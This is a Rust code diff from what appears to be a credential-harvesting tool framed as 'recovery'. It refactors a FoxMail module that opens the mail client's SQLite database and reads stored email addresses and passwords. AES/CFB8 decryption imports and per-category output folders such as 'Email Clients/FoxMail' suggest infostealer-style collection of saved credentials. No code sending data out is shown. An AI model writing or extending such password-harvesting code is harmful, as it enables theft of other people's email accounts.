@@ -1,13 +1,13 @@
 use crate::recovery::context::RecoveryContext;
 use crate::recovery::fs::{copy_dir_limited, sanitize_label};
 use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
+use crate::recovery::helpers::sqlite;
 use aes::Aes128;
 use aes::cipher::{AsyncStreamCipher, KeyIvInit};
 use async_trait::async_trait;
 use cfb8::Decryptor;
 use hex;
 use roxmltree::Document;
-use rusqlite::Connection;
 use serde::Serialize;
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
@@ -76,7 +76,6 @@ impl RecoveryTask for DirectorySnapshotTask {
         let sanitized_label = sanitize_label(&self.label);
         let base_dir = ctx
             .output_dir
-            .join("services")
             .join(self.category.to_string())
             .join(&sanitized_label);
 
@@ -192,7 +191,6 @@ impl RecoveryTask for FoxMailTask {
 
         let folder = ctx
             .output_dir
-            .join("services")
             .join("Email Clients")
             .join("FoxMail");
         fs::create_dir_all(&folder).await?;
@@ -278,17 +276,16 @@ fn parse_db_accounts(storage: &Path) -> Result<Vec<FoxMailAccount>, String> {
         return Ok(Vec::new());
     }
 
-    let connection = Connection::open(db_path).map_err(|err| err.to_string())?;
+    let connection = sqlite::Connection::open(db_path).map_err(|err| err.to_string())?;
     let mut stmt = connection
         .prepare("SELECT Email, Password, Type FROM Accounts")
         .map_err(|err| err.to_string())?;
-    let mut rows = stmt.query([]).map_err(|err| err.to_string())?;
     let mut accounts = Vec::new();
 
-    while let Some(row) = rows.next().map_err(|err| err.to_string())? {
-        let email: Option<String> = row.get(0).ok();
-        let password: Option<String> = row.get(1).ok();
-        let typ: Option<String> = row.get(2).ok();
+    while let Ok(Some(row)) = stmt.next() {
+        let email: Option<String> = row.get_text(0);
+        let password: Option<String> = row.get_text(1);
+        let typ: Option<String> = row.get_text(2);
         if let (Some(email), Some(password)) = (email, password) {
             let is_pop3 =
                 matches!(typ.as_deref(), Some(value) if value.eq_ignore_ascii_case("POP3"));
